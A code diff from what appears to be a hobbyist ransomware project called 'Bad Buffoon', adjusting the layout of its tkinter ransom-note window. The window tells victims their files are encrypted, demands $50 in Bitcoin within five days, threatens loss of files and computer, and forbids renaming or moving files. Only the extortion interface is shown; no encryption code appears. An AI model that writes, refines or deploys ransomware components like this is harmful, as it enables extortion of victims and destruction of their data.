@@ -398,28 +398,28 @@ class GUI :
 
         try : 
             self.app.title('Bad Buffoon')
-            self.app.geometry('1360x900')
+            self.app.geometry('1300x750')
             self.app.resizable(width=False, height= False)
             self.app['bg'] = 'red4'
 
             photo_joker = Image.open('{}\\Users\\{}\\Appdata\\test\\joker.jpg'.format(partition_letter,self.user_login))
-            resize_photo = photo_joker.resize((300,225), Image.ANTIALIAS)
+            resize_photo = photo_joker.resize((250,175), Image.ANTIALIAS)
             new_photo_joker = ImageTk.PhotoImage(resize_photo)
 
             photo_bitcoin = Image.open('{}\\Users\\{}\\Appdata\\test\\bitcoin.png'.format(partition_letter,self.user_login))
-            resize_photo_bitcoin = photo_bitcoin.resize((120,105), Image.ANTIALIAS)
+            resize_photo_bitcoin = photo_bitcoin.resize((80,55), Image.ANTIALIAS)
             new_photo_bitcoin = ImageTk.PhotoImage(resize_photo_bitcoin)
 
             photo_key = Image.open('{}\\Users\\{}\\Appdata\\test\\key-icon.jpg'.format(partition_letter,self.user_login))
-            resize_photo_key = photo_key.resize((100,85), Image.ANTIALIAS)
+            resize_photo_key = photo_key.resize((80,55), Image.ANTIALIAS)
             new_photo_key = ImageTk.PhotoImage(resize_photo_key)
 
 
 
-            font_msg = Font(family='Courrier', weight='bold', underline=1,size=27)
+            font_msg = Font(family='Courrier', weight='bold', underline=1,size=20)
             msg = Label(self.app,font=font_msg,text='Your files has been encrypted !', bg='red4')
             msg2 = Label(self.app,text='Send 50$ to this address : ', bg='red4', font=('Courrier', 15))
-            font_msg3 = Font(family='Courrier', weight='bold', size=16)
+            font_msg3 = Font(family='Courrier', weight='bold', size=14)
             msg3 = Label(self.app,font=font_msg3,text='If you cross this deadline your files are lost !',bg='red4' )
             font_msg4 = Font(family='Courrier', size=15)
             msg4 = Label(self.app,font=font_msg4, text="Identificaton Key : ", bg='red4')
@@ -449,13 +449,13 @@ class GUI :
 
 
             
-            msg2.place(x=970,y=465)
+            msg2.place(x=890,y=370)
             msg3.place(x=35,y=430)
-            msg4.place(x=969,y=650)
+            msg4.place(x=870,y=520)
             label_photo_joker.place(x=5 ,y=20)
-            label_photo_bitcoin.place(x=835,y=470)
-            label_photo_key.place(x=840,y=665)
-            button.place(x=820,y=815)
+            label_photo_bitcoin.place(x=800,y=390)
+            label_photo_key.place(x=800,y=550)
+            button.place(x=820,y=680)
             msg.pack()
         
             self.app.mainloop()
@@ -474,26 +474,26 @@ class GUI :
         try : 
 
             font_label1 = Font(family='Courrier', size='14', weight='bold', slant='italic', underline=1)
-            label1 = Label(self.app, font=font_label1,text='What\'s happend to my computer ?', bg='red4').place(x=900,y=100)
+            label1 = Label(self.app, font=font_label1,text='What\'s happend to my computer ?', bg='red4').place(x=900,y=20)
 
-            label2 = Label(self.app,text='All your data is encrypted. The only way to decrypt your files is our decryption service.', bg='red4').place(x=900,y=135)
+            label2 = Label(self.app,text='All your data is encrypted. The only way to decrypt your files it\'s to pay.', bg='red4').place(x=900,y=55)
 
             font_label3 = Font(family='Courrier', size='14', weight='bold', slant='italic', underline=1)
-            label3 = Label(self.app,font=font_label3, text='Can I recover my files ?', bg='red4').place(x=900, y=160)
-            label4 = Label(self.app, text='Sure. You can recover all your files easily et safestly', bg='red4').place(x=900, y=190)
-            label5 = Label(self.app,text='For recover your files you have to pay', bg='red4').place(x=900,y=210)
-            label6 = Label(self.app, text='You have 5 days to pay',bg='red4').place(x=900,y=230)
-            label7= Label(self.app, text='If you pass the deadline you will loose all your files and your computer', bg='red4').place(x=900,y=250)
+            label3 = Label(self.app,font=font_label3, text='Can I recover my files ?', bg='red4').place(x=900, y=80)
+            label4 = Label(self.app, text='Sure. You can recover all your files easily et safestly', bg='red4').place(x=900, y=110)
+            label5 = Label(self.app,text='For recover your files you have to pay', bg='red4').place(x=900,y=130)
+            label6 = Label(self.app, text='You have 5 days to pay',bg='red4').place(x=900,y=150)
+            label7= Label(self.app, text='If you pass the deadline you will loose all your files and your computer', bg='red4').place(x=900,y=170)
 
             font_label8 = Font(family='Courrier', size='14', weight='bold', slant='italic', underline=1)
-            label8 = Label(self.app,font=font_label8, text='How do I pay ?', bg='red4').place(x=900, y=280)
-            label9 = Label(self.app, text='Only Bitcoin is accepted', bg='red4').place(x=900, y=310)
-            label10 = Label(self.app, text='To buy bitcoins click on <How buy bitcoins ?>', bg='red4').place(x=900, y=330)
-            label11 = Label(self.app, text='Send 50$ to the below address',bg='red4').place(x=900, y=350)
+            label8 = Label(self.app,font=font_label8, text='How do I pay ?', bg='red4').place(x=900, y=190)
+            label9 = Label(self.app, text='Only Bitcoin is accepted', bg='red4').place(x=900, y=230)
+            label10 = Label(self.app, text='To buy bitcoins click on <How buy bitcoins ?>', bg='red4').place(x=900, y=250)
+            label11 = Label(self.app, text='Send 50$ to the below address',bg='red4').place(x=900, y=280)
             font_label12 = Font(family='Courrier', size=13)
-            label12 = Label(self.app, font=font_label12, text='DO NOT RENAME YOUR FILES !',bg='red4').place(x=900,y=380)
+            label12 = Label(self.app, font=font_label12, text='DO NOT RENAME YOUR FILES !',bg='red4').place(x=900,y=300)
             font_label13 = Font(family='Courrier', size=13)
-            label13 = Label(self.app, font=font_label13, text='DO NOT MOVE YOUR FILES !',bg='red4').place(x=900,y=410)
+            label13 = Label(self.app, font=font_label13, text='DO NOT MOVE YOUR FILES !',bg='red4').place(x=900,y=330)
 
         except : 
 
@@ -547,8 +547,8 @@ class GUI :
 
             
             label.config(state='disabled')
-            label.place(x=970,y=685)
-            button.place(x=1310,y=724)
+            label.place(x=880,y=560)
+            button.place(x=1205,y=600)
         except : 
             pass
 
@@ -606,7 +606,7 @@ class GUI :
             self.bitcoin_text.insert("1.0","xxxxxxxxxxxxxxxxxxxxx")
 
             self.bitcoin_text.config(wrap='word', state="disabled",width=150,height=2)
-            self.bitcoin_text.place(x=970, y=500)
+            self.bitcoin_text.place(x=890, y=400)
 
         except : 
             pass
@@ -616,7 +616,7 @@ class GUI :
         
 
         label1_button = Font(family='Courrier', size=15,)
-        label1 = Button(self.app, text='How buy bitcoins ?', font=label1_button, bg='red4', width=50,height=3, command=self.bitcoin_window).place(x=0,y=815)
+        label1 = Button(self.app, text='How buy bitcoins ?', font=label1_button, bg='red4', width=50,height=3, command=self.bitcoin_window).place(x=0,y=680)
 
 
     def copy_address(self) : 
@@ -628,7 +628,7 @@ class GUI :
         'Create button to copy the bitcoin address'
 
         button_copy = Button(self.app, text='Copy',width=15,height=4, bg='white',command=self.copy_address)
-        button_copy.place(x=1300,y=540)
+        button_copy.place(x=1200,y=440)
 
 
     def open_buy_video(self) : 
